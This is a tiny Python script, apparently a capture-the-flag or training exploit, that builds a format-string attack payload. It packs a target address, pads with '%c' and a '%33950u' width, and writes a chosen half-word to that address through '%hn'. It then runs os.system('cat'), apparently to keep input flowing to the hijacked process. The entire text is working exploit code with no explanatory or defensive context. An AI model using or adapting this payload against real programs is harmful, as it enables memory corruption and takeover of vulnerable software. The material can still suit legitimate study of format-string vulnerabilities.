print("\x38\x98\x04\x08" +
      "%c" * 2 +
      "%33950u" +
      "%hn"
      )

import os
import sys

sys.stdout.flush()
os.system("cat")